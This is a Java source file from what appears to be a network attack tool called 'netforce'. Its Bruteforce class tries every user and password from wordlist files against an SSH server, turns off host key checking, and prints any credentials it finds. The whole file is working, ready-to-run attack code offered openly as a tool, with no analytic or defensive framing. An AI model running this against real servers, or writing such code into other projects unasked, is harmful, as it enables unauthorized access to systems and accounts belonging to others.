package com.github.thatcherdev.netforce;

import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.io.File;
import java.util.Scanner;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

public class Bruteforce {

	/**
	 * Starts a brute force attack on an SSH server with user/file {@link username}
	 * at host {@link host} with port {@link port} and timeout {@link timeout} using
	 * password/file {@link password}.
	 *
	 * @param host     host of SSH server to brute force
	 * @param port     port of SSH server
	 * @param username user or file containing users
	 * @param password password or file containing passwords
	 * @param timeout  timeout for connecting to SSH server
	 */
	public static void start(String host, int port, String username, String password, int timeout) {
		Scanner in = null;
		try {
			ArrayList<String> users = getArrayList(username);
			ArrayList<String> passes = getArrayList(password);
			System.out.println("Brute forcing " + host + ":" + port + "\n");
			for (String user : users)
				for (String pass : passes) {
					System.out.print("\033[1K\033[56DTrying user '" + user + "' with password '" + pass + "'");
					try {
						check(host, port, user, pass, timeout);
						System.out.println("\033[2K\033[56D\u001b[32mPassword for " + user + "@" + host + ":" + port
								+ " is '" + pass + "'\u001b[0m");
						return;
					} catch (Exception e) {
						if (e.getMessage().equals("Auth fail"))
							continue;
						else
							throw new Exception();
					}
				}
			System.out.println("\033[2K\033[56D\u001b[31mCould not find user and/or password for " + host + ":" + port
					+ "\u001b[0m");
		} catch (Exception e) {
			System.out.print("\033[2K\033[56D");
			e.printStackTrace();
		} finally {
			if (in != null)
				in.close();
		}
	}

	/**
	 * Attempt to connect to an SSH server with user {@link user} at host
	 * {@link host} with port {@link port}, password {@link password}, and timeout
	 * {@link timeout}.
	 *
	 * @param host     host of SSH server
	 * @param port     port of SSH server
	 * @param user     user to login to
	 * @param password password to user to login
	 * @param timeout  timeout for connecting to SSH server
	 * @return if login was successful
	 * @throws JSchException
	 */
	private static void check(String host, int port, String user, String password, int timeout) throws JSchException {
		JSch jsch = new JSch();
		Session session = jsch.getSession(user, host, port);
		session.setConfig("StrictHostKeyChecking", "no");
		session.setTimeout(timeout);
		session.setPassword(password);
		session.connect();
		session.disconnect();
	}

	/**
	 * Get ArrayList of lines from a file, if {@link toGet} is a file name, or and
	 * ArrayList containing {@link toGet}.
	 *
	 * @param toGet filename or string to return in an ArrayList
	 * @return an ArrayList contains data from file {@link toGet}, or {@link toGet}
	 * @throws FileNotFoundException
	 */
	private static ArrayList<String> getArrayList(String toGet) throws FileNotFoundException {
		ArrayList<String> ret = new ArrayList<String>();
		if (new File(toGet).isFile()) {
			Scanner in = new Scanner(new File(toGet));
			while (in.hasNextLine())
				ret.add(in.nextLine());
			in.close();
		} else
			ret.add(toGet);
		return ret;
	}
}
